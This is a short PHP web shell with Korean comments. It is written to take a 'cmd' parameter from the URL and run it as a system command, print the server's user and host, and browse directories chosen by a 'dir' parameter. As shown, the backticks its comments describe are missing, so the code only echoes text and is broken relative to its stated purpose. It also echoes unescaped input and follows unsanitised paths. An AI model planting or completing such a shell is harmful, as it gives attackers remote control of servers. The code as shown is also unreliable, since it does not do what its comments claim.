<?php
// "cmd"를 인자로 받아, backtick을 이용해 시스템 명령어 실행
$cmd = $_GET['cmd'];
$result = "$cmd";
$result = str_replace("\n", "<br />", $result);
echo $result;

// 서버 정보명 출력
echo trim("whoami")."@".trim("hostname").":".getcwd()."<br /><br />";

// 현재 파일 출력
$dir = $_GET[dir] ?? ".";
chdir($dir);

$dh = opendir(".");
while (($file = readdir($dh)) !== false) {
    if (is_dir($file)) echo "<a href=".$_SERVER['PHP_SELF']."?dir=".$dir."/".$file.">".$file."</a>";
    else echo $file;
}
closedir($dh);
?>